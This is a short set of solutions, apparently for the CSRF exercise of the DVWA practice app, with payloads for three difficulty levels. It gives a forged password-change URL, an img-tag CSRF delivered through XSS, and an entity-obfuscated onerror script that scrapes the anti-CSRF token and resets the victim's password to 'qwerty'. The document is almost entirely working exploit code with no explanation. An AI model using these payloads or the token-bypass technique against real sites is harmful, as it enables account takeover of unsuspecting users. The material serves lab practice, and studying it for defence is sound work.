# CSRF

## low

```
http://localhost/vulnerabilities/csrf/?password_new=qwerty&password_conf=qwerty&Change=Change
```

## medium

XSS this

`<img src="http://localhost/vulnerabilities/csrf/?password_new=qwerty&password_conf=qwerty&Change=Change">`

## high

bypass csrf token

XSS this

```js
<img src="" onerror="javascri&#112;t:a=new XMLHtt&#112;Request();a.o&#112;en('GET','htt&#112;://localhost/vulnerabilities/csrf/');a.send();a.onload=()=>{if(a.readyState==4&&a.status==200){b=new XMLHtt&#112;Request();b.o&#112;en('GET','htt&#112;://localhost/vulnerabilities/csrf/?&#112;assword_new=qwerty&&#112;assword_conf=qwerty&Change=Change&user_token='+a.res&#112;onse.substr(a.res&#112;onse.search(/[0-9a-zA-Z]{32}/),32));b.send();}else{console.log(a.status);}};">
```
